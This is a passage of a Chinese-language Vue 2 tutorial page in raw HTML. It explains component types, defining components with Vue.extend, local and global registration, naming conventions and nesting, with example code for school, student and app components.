title="组件分类"></a>组件分类</h3><ol><li><p>非单文件组件</p><p>一个文件中包含有n个组件</p></li><li><p>单文件组件</p><p>一个文件中只包含由1个组件</p></li></ol><p>组件就是一块砖，哪里需要哪里搬</p><p>template属性必须包含根元素</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202141442348.png" alt="image-20220214144255231"></p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202141525418.png" alt="image-20220214152512376"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;基本使用&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">Vue中使用组件的三大步骤：</span><br><span class="line">一、定义组件(创建组件)</span><br><span class="line">二、注册组件</span><br><span class="line">三、使用组件(写组件标签)</span><br><span class="line"></span><br><span class="line">一、如何定义一个组件？</span><br><span class="line">使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；</span><br><span class="line">区别如下：</span><br><span class="line">1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。</span><br><span class="line">2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。</span><br><span class="line">备注：使用template可以配置组件结构。</span><br><span class="line"></span><br><span class="line">二、如何注册组件？</span><br><span class="line">1.局部注册：靠new Vue的时候传入components选项</span><br><span class="line">2.全局注册：靠Vue.component(&#x27;组件名&#x27;,组件)</span><br><span class="line"></span><br><span class="line">三、编写组件标签：</span><br><span class="line">&lt;school&gt;&lt;/school&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">&lt;hello&gt;&lt;/hello&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123;msg&#125;&#125;&lt;/h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;!-- 第三步：编写组件标签 --&gt;</span><br><span class="line">&lt;school&gt;&lt;/school&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;!-- 第三步：编写组件标签 --&gt;</span><br><span class="line">&lt;student&gt;&lt;/student&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;root2&quot;&gt;</span><br><span class="line">&lt;hello&gt;&lt;/hello&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line"></span><br><span class="line">//第一步：创建school组件</span><br><span class="line">const school = Vue.extend(&#123;</span><br><span class="line">template:`</span><br><span class="line">&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">&lt;h2&gt;学校名称：&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">`,</span><br><span class="line">// el:&#x27;#root&#x27;, //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。</span><br><span class="line">data()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">schoolName:&#x27;尚硅谷&#x27;,</span><br><span class="line">address:&#x27;北京昌平&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">showName()&#123;</span><br><span class="line">alert(this.schoolName)</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//第一步：创建student组件</span><br><span class="line">const student = Vue.extend(&#123;</span><br><span class="line">template:`</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;h2&gt;学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;h2&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">`,</span><br><span class="line">data()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">studentName:&#x27;张三&#x27;,</span><br><span class="line">age:18</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//第一步：创建hello组件</span><br><span class="line">const hello = Vue.extend(&#123;</span><br><span class="line">template:`</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;h2&gt;你好啊！&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">`,</span><br><span class="line">data()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">name:&#x27;Tom&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//第二步：全局注册组件</span><br><span class="line">Vue.component(&#x27;hello&#x27;,hello)</span><br><span class="line"></span><br><span class="line">//创建vm</span><br><span class="line">new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">msg:&#x27;你好啊！&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">//第二步：注册组件（局部注册）</span><br><span class="line">components:&#123;</span><br><span class="line">school,</span><br><span class="line">student</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">el:&#x27;#root2&#x27;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="组件命名几个注意的点"><a href="#组件命名几个注意的点" class="headerlink" title="组件命名几个注意的点"></a>组件命名几个注意的点</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>几个注意点<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">几个注意点：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.关于组件名:</span></span></span><br><span class="line"><span class="comment"><span class="xml">一个单词组成：</span></span></span><br><span class="line"><span class="comment"><span class="xml">第一种写法(首字母小写)：school</span></span></span><br><span class="line"><span class="comment"><span class="xml">第二种写法(首字母大写)：School</span></span></span><br><span class="line"><span class="comment"><span class="xml">多个单词组成：</span></span></span><br><span class="line"><span class="comment"><span class="xml">第一种写法(kebab-case命名)：my-school</span></span></span><br><span class="line"><span class="comment"><span class="xml">第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)</span></span></span><br><span class="line"><span class="comment"><span class="xml">备注：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).可以使用name配置项指定组件在开发者工具中呈现的名字。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">2.关于组件标签:</span></span></span><br><span class="line"><span class="comment"><span class="xml">第一种写法：&lt;school&gt;&lt;/school&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xml">第二种写法：&lt;school/&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xml">备注：不用使用脚手架时，&lt;school/&gt;会导致后续组件不能渲染。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">3.一个简写方式：</span></span></span><br><span class="line"><span class="comment"><span class="xml">const school = Vue.extend(options) 可简写为：const school = options</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//定义组件</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> s = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;atguigu&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">template</span>:<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">&lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript"><span class="xml">`</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">msg</span>:<span class="string">&#x27;欢迎学习Vue!&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">components</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">school</span>:s</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="组件的嵌套"><a href="#组件的嵌套" class="headerlink" title="组件的嵌套"></a>组件的嵌套</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>组件的嵌套<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">//定义student组件</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">const student = Vue.extend(&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">name:&#x27;student&#x27;,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">template:`</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生姓名：</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：</span><span class="template-variable">&#123;&#123;<span class="name">age</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">`,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">data()&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">return &#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">name:&#x27;尚硅谷&#x27;,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">age:18</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;)</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">//定义school组件</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">const school = Vue.extend(&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">name:&#x27;school&#x27;,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">template:`</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">`,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">data()&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">return &#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">name:&#x27;尚硅谷&#x27;,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">address:&#x27;北京&#x27;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">//注册组件（局部）</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">components:&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">student</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;)</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">//定义hello组件</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">const hello = Vue.extend(&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">template:`<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">msg</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>`,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">data()&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">return &#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">msg:&#x27;欢迎来到尚硅谷学习！&#x27;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;)</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">//定义app组件</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">const app = Vue.extend(&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">template:`</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">`,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">components:&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">school,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">hello</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;)</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">//创建vm</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">new Vue(&#123;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">template:&#x27;<span class="tag">&lt;<span class="name">app</span>&gt;</span><span class="tag">&lt;/<span class="name">app</span>&gt;</span>&#x27;,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">el:&#x27;#root&#x27;,</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">//注册组件（局部）</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">components:&#123;app&#125;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml">&#125;)</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"></span></span><span 